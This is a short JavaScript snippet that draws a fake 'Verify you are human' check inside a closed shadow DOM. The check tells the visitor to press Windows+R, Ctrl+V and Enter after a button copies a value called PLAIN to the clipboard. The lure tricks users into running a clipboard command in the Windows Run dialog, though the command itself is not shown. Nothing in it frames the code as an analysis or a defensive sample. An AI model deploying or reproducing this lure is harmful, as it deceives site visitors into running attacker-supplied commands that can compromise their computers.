const h=document.getElementById('h');const r=h.attachShadow({mode:'closed'});r.innerHTML='<h1>Verify you are human</h1><p>1. Press Windows + R</p><p>2. Press Ctrl + V</p><p>3. Press Enter</p>';
b.onclick=()=>{navigator.clipboard.writeText(PLAIN).then(()=>document.title='done')}
